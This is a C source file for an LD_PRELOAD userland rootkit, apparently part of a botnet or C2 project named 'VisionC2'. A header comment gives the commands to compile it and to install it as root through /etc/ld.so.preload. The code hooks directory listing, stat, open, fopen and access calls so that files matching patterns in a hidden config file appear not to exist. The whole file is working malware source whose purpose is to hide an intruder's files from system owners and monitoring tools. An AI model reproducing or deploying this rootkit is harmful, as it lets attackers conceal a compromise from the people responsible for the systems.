/*
 * rootkit.c — LD_PRELOAD userland rootkit for VisionC2
 *
 * Compile:
 *   gcc -shared -fPIC -nostartfiles -o libproc.so rootkit.c -ldl
 *
 * Install (as root):
 *   cp libproc.so /usr/lib/libproc.so
 *   echo /usr/lib/libproc.so >> /etc/ld.so.preload
 *
 * Hidden patterns are read from /etc/.sysconf (one per line) at library
 * load time.  Any path or directory entry that contains a hidden pattern
 * as a substring is silently suppressed.
 *
 * Hooked functions:
 *   readdir / readdir64        — hide directory entries
 *   __xstat / __lxstat         — hide by path (stat/lstat)
 *   __xstat64 / __lxstat64     — 64-bit stat variants
 *   open / openat              — hide by path (return ENOENT)
 *   fopen / fopen64            — hide by path (return NULL / ENOENT)
 *   access / faccessat         — hide by path (return ENOENT)
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <dirent.h>
#include <sys/stat.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdarg.h>

/* =========================================================================
 * Configuration
 * ========================================================================= */

#define CONF_PATH        "/etc/.sysconf"
#define MAX_PATTERNS     32
#define MAX_PATTERN_LEN  256

/* =========================================================================
 * Hidden pattern table (populated by the constructor)
 * ========================================================================= */

static char  hidden_patterns[MAX_PATTERNS][MAX_PATTERN_LEN];
static int   hidden_count = 0;

/* =========================================================================
 * Internal helpers
 * ========================================================================= */

/*
 * is_hidden — return 1 if 'name' contains any hidden pattern as a substring.
 * A NULL or empty name is never hidden.
 */
static int is_hidden(const char *name)
{
    if (!name || name[0] == '\0')
        return 0;

    for (int i = 0; i < hidden_count; i++) {
        if (hidden_patterns[i][0] != '\0' &&
            strstr(name, hidden_patterns[i]) != NULL)
            return 1;
    }
    return 0;
}

/*
 * load_patterns — read CONF_PATH and populate hidden_patterns[].
 * Called once from the library constructor.
 */
static void load_patterns(void)
{
    FILE *f = fopen(CONF_PATH, "r");
    if (!f)
        return;

    char line[MAX_PATTERN_LEN];
    while (fgets(line, sizeof(line), f) && hidden_count < MAX_PATTERNS) {
        /* strip trailing newline / carriage-return */
        size_t len = strlen(line);
        while (len > 0 && (line[len-1] == '\n' || line[len-1] == '\r'))
            line[--len] = '\0';

        if (len == 0)
            continue;

        strncpy(hidden_patterns[hidden_count], line, MAX_PATTERN_LEN - 1);
        hidden_patterns[hidden_count][MAX_PATTERN_LEN - 1] = '\0';
        hidden_count++;
    }

    fclose(f);
}

/* =========================================================================
 * Constructor / Destructor
 * ========================================================================= */

__attribute__((constructor))
static void rootkit_init(void)
{
    load_patterns();
}

/* =========================================================================
 * readdir / readdir64 hooks
 * ========================================================================= */

typedef struct dirent  dirent_t;
typedef struct dirent64 dirent64_t;

dirent_t *readdir(DIR *dirp)
{
    static dirent_t *(*orig_readdir)(DIR *) = NULL;
    if (!orig_readdir)
        orig_readdir = (dirent_t *(*)(DIR *))dlsym(RTLD_NEXT, "readdir");

    dirent_t *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        if (!is_hidden(entry->d_name))
            return entry;
        /* entry is hidden — skip it and try the next one */
    }
    return NULL;  /* end of directory */
}

dirent64_t *readdir64(DIR *dirp)
{
    static dirent64_t *(*orig_readdir64)(DIR *) = NULL;
    if (!orig_readdir64)
        orig_readdir64 = (dirent64_t *(*)(DIR *))dlsym(RTLD_NEXT, "readdir64");

    dirent64_t *entry;
    while ((entry = orig_readdir64(dirp)) != NULL) {
        if (!is_hidden(entry->d_name))
            return entry;
    }
    return NULL;
}

/* =========================================================================
 * stat / lstat hooks  (__xstat / __lxstat / __xstat64 / __lxstat64)
 * ========================================================================= */

int __xstat(int ver, const char *path, struct stat *buf)
{
    static int (*orig)(int, const char *, struct stat *) = NULL;
    if (!orig)
        orig = (int (*)(int, const char *, struct stat *))dlsym(RTLD_NEXT, "__xstat");

    if (is_hidden(path)) {
        errno = ENOENT;
        return -1;
    }
    return orig(ver, path, buf);
}

int __lxstat(int ver, const char *path, struct stat *buf)
{
    static int (*orig)(int, const char *, struct stat *) = NULL;
    if (!orig)
        orig = (int (*)(int, const char *, struct stat *))dlsym(RTLD_NEXT, "__lxstat");

    if (is_hidden(path)) {
        errno = ENOENT;
        return -1;
    }
    return orig(ver, path, buf);
}

int __xstat64(int ver, const char *path, struct stat64 *buf)
{
    static int (*orig)(int, const char *, struct stat64 *) = NULL;
    if (!orig)
        orig = (int (*)(int, const char *, struct stat64 *))dlsym(RTLD_NEXT, "__xstat64");

    if (is_hidden(path)) {
        errno = ENOENT;
        return -1;
    }
    return orig(ver, path, buf);
}

int __lxstat64(int ver, const char *path, struct stat64 *buf)
{
    static int (*orig)(int, const char *, struct stat64 *) = NULL;
    if (!orig)
        orig = (int (*)(int, const char *, struct stat64 *))dlsym(RTLD_NEXT, "__lxstat64");

    if (is_hidden(path)) {
        errno = ENOENT;
        return -1;
    }
    return orig(ver, path, buf);
}

/* =========================================================================
 * open / openat hooks
 * ========================================================================= */

int open(const char *path, int flags, ...)
{
    static int (*orig_open)(const char *, int, ...) = NULL;
    if (!orig_open)
        orig_open = (int (*)(const char *, int, ...))dlsym(RTLD_NEXT, "open");

    if (is_hidden(path)) {
        errno = ENOENT;
        return -1;
    }

    /* Forward variadic mode argument if O_CREAT / O_TMPFILE is set. */
    if (flags & (O_CREAT
#ifdef O_TMPFILE
                 | O_TMPFILE
#endif
                )) {
        va_list ap;
        va_start(ap, flags);
        mode_t mode = (mode_t)va_arg(ap, unsigned int);
        va_end(ap);
        return orig_open(path, flags, mode);
    }
    return orig_open(path, flags);
}

int open64(const char *path, int flags, ...)
{
    static int (*orig_open64)(const char *, int, ...) = NULL;
    if (!orig_open64)
        orig_open64 = (int (*)(const char *, int, ...))dlsym(RTLD_NEXT, "open64");

    if (is_hidden(path)) {
        errno = ENOENT;
        return -1;
    }

    if (flags & (O_CREAT
#ifdef O_TMPFILE
                 | O_TMPFILE
#endif
                )) {
        va_list ap;
        va_start(ap, flags);
        mode_t mode = (mode_t)va_arg(ap, unsigned int);
        va_end(ap);
        return orig_open64(path, flags, mode);
    }
    return orig_open64(path, flags);
}

int openat(int dirfd, const char *path, int flags, ...)
{
    static int (*orig_openat)(int, const char *, int, ...) = NULL;
    if (!orig_openat)
        orig_openat = (int (*)(int, const char *, int, ...))dlsym(RTLD_NEXT, "openat");

    if (is_hidden(path)) {
        errno = ENOENT;
        return -1;
    }

    if (flags & (O_CREAT
#ifdef O_TMPFILE
                 | O_TMPFILE
#endif
                )) {
        va_list ap;
        va_start(ap, flags);
        mode_t mode = (mode_t)va_arg(ap, unsigned int);
        va_end(ap);
        return orig_openat(dirfd, path, flags, mode);
    }
    return orig_openat(dirfd, path, flags);
}

/* =========================================================================
 * fopen / fopen64 hooks
 * ========================================================================= */

FILE *fopen(const char *path, const char *mode)
{
    static FILE *(*orig_fopen)(const char *, const char *) = NULL;
    if (!orig_fopen)
        orig_fopen = (FILE *(*)(const char *, const char *))dlsym(RTLD_NEXT, "fopen");

    if (is_hidden(path)) {
        errno = ENOENT;
        return NULL;
    }
    return orig_fopen(path, mode);
}

FILE *fopen64(const char *path, const char *mode)
{
    static FILE *(*orig_fopen64)(const char *, const char *) = NULL;
    if (!orig_fopen64)
        orig_fopen64 = (FILE *(*)(const char *, const char *))dlsym(RTLD_NEXT, "fopen64");

    if (is_hidden(path)) {
        errno = ENOENT;
        return NULL;
    }
    return orig_fopen64(path, mode);
}

/* =========================================================================
 * access / faccessat hooks
 * ========================================================================= */

int access(const char *path, int mode)
{
    static int (*orig_access)(const char *, int) = NULL;
    if (!orig_access)
        orig_access = (int (*)(const char *, int))dlsym(RTLD_NEXT, "access");

    if (is_hidden(path)) {
        errno = ENOENT;
        return -1;
    }
    return orig_access(path, mode);
}

int faccessat(int dirfd, const char *path, int mode, int flags)
{
    static int (*orig_faccessat)(int, const char *, int, int) = NULL;
    if (!orig_faccessat)
        orig_faccessat = (int (*)(int, const char *, int, int))dlsym(RTLD_NEXT, "faccessat");

    if (is_hidden(path)) {
        errno = ENOENT;
        return -1;
    }
    return orig_faccessat(dirfd, path, mode, flags);
}

